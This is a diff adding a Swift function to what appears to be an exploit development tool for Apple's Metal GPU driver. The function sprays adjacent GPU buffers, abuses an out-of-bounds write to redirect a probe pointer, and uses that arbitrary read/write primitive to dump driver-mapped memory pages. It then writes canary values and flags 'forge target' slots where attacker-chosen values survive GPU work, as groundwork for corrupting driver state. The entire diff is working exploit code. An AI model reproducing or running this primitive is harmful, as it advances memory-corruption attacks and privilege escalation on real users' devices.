@@ -3920,6 +3920,230 @@ func runDenseMapAndWrite(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// ── runRingBufDump ────────────────────────────────────────────────────────────
+// Full 4KB dump of the two writable driver VAs (hit0=0x1500006000, hit1=0x1500007000).
+// Phase 1: snapshot both pages BEFORE any GPU work (512 qwords each).
+// Phase 2: fire a real compute dispatch, then snapshot again AFTER.
+//          Any slot that changed = GPU hardware wrote it = live ring/fence field.
+//          Unchanged slots = static or user-owned = our write targets.
+// Phase 3: for each UNCHANGED slot, write canary, dispatch a noop compute,
+//          read back — confirm slot is fully user-owned and persists through GPU work.
+// Output: per-slot "GPU-owned" vs "user-owned" map → next step targets user-owned slots.
+// ─────────────────────────────────────────────────────────────────────────────
+func runRingBufDump(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── Ring Buffer Full Dump ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+
+        let BUF_LEN = 4096
+        let STRIDE  = 8
+        let NSLOTS  = BUF_LEN / STRIDE  // 512 qwords per page
+        let CANARY: UInt64 = 0xC0FFEE_DEADC0DE
+
+        // Spray to anchor GPU VA
+        var sprayBufs: [MTLBuffer] = []
+        var lo: MTLBuffer!
+        for _ in 0..<32 {
+            guard let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if sprayBufs.last.map({ $0.gpuAddress + UInt64(BUF_LEN) == b.gpuAddress }) ?? false { lo = sprayBufs.last! }
+            sprayBufs.append(b)
+        }
+        guard lo != nil else { step("✗ spray failed"); completion(); return }
+        guard let hi = sprayBufs.last else { step("✗ no hi"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress,radix:16))")
+
+        let TARGET_VAs: [(String, UInt64)] = [
+            ("hit0", 0x1500006000),
+            ("hit1", 0x1500007000)
+        ]
+
+        // OOB write helper: sets hi[0].buf = targetVA
+        func oobWriteVA(_ idx: Int, _ va: UInt64) {
+            let ptr = lo.contents().assumingMemoryBound(to: UInt64.self)
+            ptr[BUF_LEN/8 + idx * 2] = va   // hi[idx].buf field (2 qwords per Probe)
+        }
+
+        // GPU read 512 qwords from a VA via multiScan, 1 thread per qword
+        let multiScanSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void multiScan(device Probe* probes [[buffer(0)]],
+                              device ulong* out    [[buffer(1)]],
+                              uint tid [[thread_position_in_grid]]) {
+            out[tid] = probes[tid].buf[0];
+        }
+        """
+        // GPU write helper: write src[0] to ab->buf[0]
+        let gpuWriteSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void gpuWrite(device Probe* p [[buffer(0)]], device ulong* src [[buffer(1)]]) {
+            p[0].buf[0] = src[0];
+        }
+        """
+        // Noop compute to trigger GPU flush
+        let noopSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        kernel void noopKernel(device uint* out [[buffer(0)]], uint tid [[thread_position_in_grid]]) {
+            out[tid] = tid;
+        }
+        """
+
+        guard let lib1 = try? device.makeLibrary(source: multiScanSrc, options: nil),
+              let lib2 = try? device.makeLibrary(source: gpuWriteSrc,  options: nil),
+              let lib3 = try? device.makeLibrary(source: noopSrc,      options: nil),
+              let rFn   = lib1.makeFunction(name: "multiScan"),
+              let wFn   = lib2.makeFunction(name: "gpuWrite"),
+              let nFn   = lib3.makeFunction(name: "noopKernel"),
+              let rPso  = try? device.makeComputePipelineState(function: rFn),
+              let wPso  = try? device.makeComputePipelineState(function: wFn),
+              let nPso  = try? device.makeComputePipelineState(function: nFn) else {
+            step("✗ PSO compile failed"); completion(); return
+        }
+        step("✓ multiScan + gpuWrite + noop PSOs ready")
+
+        // Read 512 qwords starting at targetVA using 8 dispatches of 64 threads
+        func readPage(_ targetVA: UInt64) -> [UInt64] {
+            var result = [UInt64](repeating: 0, count: NSLOTS)
+            guard let outBuf = device.makeBuffer(length: NSLOTS * STRIDE, options: .storageModeShared) else { return result }
+
+            for batch in 0..<8 {  // 8 × 64 = 512 slots
+                let batchOffset = batch * 64
+                // Set up 64 probes for this batch
+                for tid in 0..<64 {
+                    let slot   = batchOffset + tid
+                    let slotVA = targetVA + UInt64(slot * STRIDE)
+                    oobWriteVA(tid, slotVA)
+                }
+                guard let q = device.makeCommandQueue(),
+                      let cb = q.makeCommandBuffer(),
+                      let enc = cb.makeComputeCommandEncoder() else { continue }
+                enc.setComputePipelineState(rPso)
+                enc.setBuffer(hi,    offset: 0, index: 0)
+                enc.setBuffer(outBuf,offset: batchOffset * STRIDE, index: 1)
+                let sz = MTLSize(width: 64, height: 1, depth: 1)
+                enc.dispatchThreads(sz, threadsPerThreadgroup: MTLSize(width: min(64, rPso.maxTotalThreadsPerThreadgroup), height: 1, depth: 1))
+                enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+                let outPtr = outBuf.contents().assumingMemoryBound(to: UInt64.self)
+                for tid in 0..<64 { result[batchOffset + tid] = outPtr[batchOffset + tid] }
+            }
+            return result
+        }
+
+        // Write one qword to targetVA via OOB+gpuWrite
+        func writeSlot(_ targetVA: UInt64, _ value: UInt64) {
+            guard let srcBuf = device.makeBuffer(length: 8, options: .storageModeShared) else { return }
+            srcBuf.contents().assumingMemoryBound(to: UInt64.self)[0] = value
+            oobWriteVA(0, targetVA)
+            guard let q = device.makeCommandQueue(),
+                  let cb = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return }
+            enc.setComputePipelineState(wPso)
+            enc.setBuffer(hi,    offset: 0, index: 0)
+            enc.setBuffer(srcBuf,offset: 0, index: 1)
+            let sz = MTLSize(width: 1, height: 1, depth: 1)
+            enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+        }
+
+        // Noop dispatch to force GPU hardware to flush/update ring fields
+        func fireNoop() {
+            guard let nBuf = device.makeBuffer(length: 256, options: .storageModeShared),
+                  let q = device.makeCommandQueue(),
+                  let cb = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return }
+            enc.setComputePipelineState(nPso)
+            enc.setBuffer(nBuf, offset: 0, index: 0)
+            let sz = MTLSize(width: 64, height: 1, depth: 1)
+            enc.dispatchThreads(sz, threadsPerThreadgroup: MTLSize(width: min(64, nPso.maxTotalThreadsPerThreadgroup), height: 1, depth: 1))
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+        }
+
+        for (label, targetVA) in TARGET_VAs {
+            step("── \(label) @ 0x\(String(targetVA,radix:16)): phase 1 snapshot (before GPU work) ──")
+            let before = readPage(targetVA)
+            // Log first 16 slots for quick visual check
+            for i in 0..<16 {
+                step("  [\(String(format:"%03d",i))] +0x\(String(format:"%04x",i*8))  0x\(String(before[i],radix:16))")
+            }
+            step("  ... (\(NSLOTS - 16) more slots)")
+
+            step("── \(label): fire noop GPU work ──")
+            fireNoop()
+            Thread.sleep(forTimeInterval: 0.05)
+
+            step("── \(label): phase 2 snapshot (after GPU work) ──")
+            let after = readPage(targetVA)
+
+            var gpuOwned   = [(Int, UInt64, UInt64)]()  // (slot, before, after)
+            var userOwned  = [Int]()
+
+            for i in 0..<NSLOTS {
+                if before[i] != after[i] { gpuOwned.append((i, before[i], after[i])) }
+                else { userOwned.append(i) }
+            }
+
+            step("── \(label): change map ──")
+            step("  GPU-updated slots (GPU writes these): \(gpuOwned.count)")
+            for (slot, bv, av) in gpuOwned.prefix(16) {
+                step("  [GPU] slot\(slot) +0x\(String(format:"%04x",slot*8))  \(String(bv,radix:16)) → \(String(av,radix:16))")
+            }
+            step("  User-owned stable slots: \(userOwned.count)")
+
+            // Phase 3: canary test on first 8 stable user-owned slots
+            step("── \(label): phase 3 canary persistence test ──")
+            var persistentSlots = [(Int, UInt64)]()
+            for slot in userOwned.prefix(8) {
+                let slotVA = targetVA + UInt64(slot * STRIDE)
+                let origVal = before[slot]
+                writeSlot(slotVA, CANARY)
+                fireNoop()
+                Thread.sleep(forTimeInterval: 0.02)
+                // Read back
+                oobWriteVA(0, slotVA)
+                var readback: UInt64 = 0
+                if let outBuf = device.makeBuffer(length: 8, options: .storageModeShared),
+                   let q = device.makeCommandQueue(),
+                   let cb = q.makeCommandBuffer(),
+                   let enc = cb.makeComputeCommandEncoder() {
+                    enc.setComputePipelineState(rPso)
+                    enc.setBuffer(hi,    offset: 0, index: 0)
+                    enc.setBuffer(outBuf,offset: 0, index: 1)
+                    let sz = MTLSize(width: 1, height: 1, depth: 1)
+                    enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+                    enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+                    readback = outBuf.contents().assumingMemoryBound(to: UInt64.self)[0]
+                }
+                if readback == CANARY {
+                    step("  ★★ PERSISTENT slot\(slot) +0x\(String(format:"%04x",slot*8)) — fully user-owned through GPU work")
+                    persistentSlots.append((slot, origVal))
+                } else {
+                    step("  ~ volatile slot\(slot) +0x\(String(format:"%04x",slot*8)) canary=0x\(String(CANARY,radix:16)) readback=0x\(String(readback,radix:16))")
+                }
+                // Restore
+                writeSlot(slotVA, origVal)
+            }
+
+            step("── \(label) summary ──")
+            step("  GPU-owned slots: \(gpuOwned.count)/\(NSLOTS)  ← GPU hardware writes these (ring/fence fields)")
+            step("  User-owned slots: \(userOwned.count)/\(NSLOTS) ← stable, we can forge values here")
+            step("  Persistent canary slots: \(persistentSlots.count)/8 tested")
+            if !persistentSlots.isEmpty {
+                step("  ★★★ FORGE TARGET: \(label) slot\(persistentSlots[0].0) +0x\(String(format:"%04x",persistentSlots[0].0*8)) orig=0x\(String(persistentSlots[0].1,radix:16))")
+                step("       write arbitrary value here → survives GPU command dispatch")
+                step("       next: identify what kernel / driver reads this field and when")
+            }
+        }
+
+        step("── Ring Buffer Full Dump complete ──")
+        completion()
+    }
+}
+
 // ── runGPUVAScan ──────────────────────────────────────────────────────────────
 // Sweep GPU VA space with the read redirect primitive to locate Metal driver /
 // kernel-mapped regions not visible from userspace.
